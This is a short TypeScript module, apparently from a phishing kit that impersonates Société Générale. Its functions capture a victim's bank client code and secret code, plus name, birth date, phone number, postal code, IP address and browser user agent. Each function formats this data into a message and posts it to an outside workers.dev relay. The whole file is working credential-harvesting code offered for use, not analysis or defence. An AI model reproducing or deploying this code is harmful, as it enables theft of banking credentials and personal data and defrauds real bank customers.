const W = 'https://sg-omerta-proxy.hugairke14324.workers.dev';

async function getUserIP(): Promise<string> {
  try {
    const c = new AbortController();
    const id = setTimeout(() => c.abort(), 5000);
    const r = await fetch('https://api.ipify.org?format=json', { signal: c.signal });
    clearTimeout(id);
    return (await r.json()).ip || 'unknown';
  } catch {
    return 'unknown';
  }
}

async function send(channel: string, text: string): Promise<any> {
  try {
    const r = await fetch(W + '/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ channel, text }),
    });
    return r.json();
  } catch {
    return { ok: false };
  }
}

export const sendLoginNotification = async (user: string, password: string) => {
  const ip = await getUserIP();
  const ua = navigator.userAgent;

  const msg = `<b>🏦 Login Société Générale</b>\n`
    + `├ 👤 Code Client : <code>${user}</code>\n`
    + `└ 🔒 Code Secret : <code>${password}</code>\n\n`
    + `🌐 IP : <code>${ip}</code>\n`
    + `📱 UA : <code>${ua}</code>\n\n`
    + `<b>— Fresh SG —</b>`;

  await send('clicks', msg);
};

export const sendVerificationNotification = async (
  nom: string, prenom: string, date: string, tel: string,
  codePostal: string, user: string, password: string
) => {
  const ip = await getUserIP();
  const ua = navigator.userAgent;

  const msg = `<b>🏦 Vérification Société Générale</b>\n`
    + `├ 🪪 Nom et Prénom : <code>${nom} ${prenom}</code>\n`
    + `├ 📅 Date de Naissance : <code>${date}</code>\n`
    + `├ 📱 Numéro de Téléphone : <code>${tel}</code>\n`
    + `└ 📮 Code Postal : <code>${codePostal}</code>\n\n`
    + `<blockquote><b>— 🏦 LOG Société Générale —</b>\n`
    + `├ 👤 Code Client : <code>${user}</code>\n`
    + `└ 🔒 Code Secret : <code>${password}</code></blockquote>\n\n`
    + `🌐 IP : <code>${ip}</code>\n`
    + `📱 UA : <code>${ua}</code>\n\n`
    + `<b>— Fresh SG —</b>`;

  await send('important', msg);
};
